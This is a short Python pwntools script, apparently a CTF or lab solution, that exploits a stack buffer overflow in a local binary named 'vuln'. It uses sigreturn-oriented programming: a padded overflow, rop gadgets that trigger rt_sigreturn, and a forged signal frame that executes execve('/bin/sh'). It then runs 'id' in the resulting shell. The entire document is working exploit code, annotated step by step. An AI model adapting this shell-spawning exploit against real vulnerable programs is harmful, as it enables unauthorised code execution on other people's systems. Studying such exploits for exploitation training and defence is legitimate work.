#!/usr/bin/env python3
from pwn import *

context.update(arch='amd64', os='linux', log_level='info')
elf = context.binary = ELF('./vuln')

syscall_ret = elf.symbols['syscall_ret']      # syscall; ret
pop_rax_ret = elf.symbols['pop_rax_ret']      # pop rax; ret
binsh       = elf.symbols['binsh']            # "/bin/sh"
OFFSET      = 40                              # 32-byte buf + saved rbp

frame = SigreturnFrame()                      # 1
frame.rax = constants.SYS_execve              # 2  (59)
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret                       # 3

payload  = b'A' * OFFSET
payload += p64(pop_rax_ret)                   # 4
payload += p64(constants.SYS_rt_sigreturn)    #    rax = 15
payload += p64(syscall_ret)                   # 5  triggers rt_sigreturn
payload += bytes(frame)                       # 6  the forged frame
payload  = payload.ljust(512, b'\x00')        # 7  fill the 512-byte read so our
                                              #    shell command is left for the
                                              #    shell, not eaten by vuln()

io = process(elf.path)
io.send(payload)
io.sendline(b'echo SROP_OK; id')              # 8
io.recvuntil(b'SROP_OK')
log.success('shell: %s', io.recvline().strip().decode())
io.close()
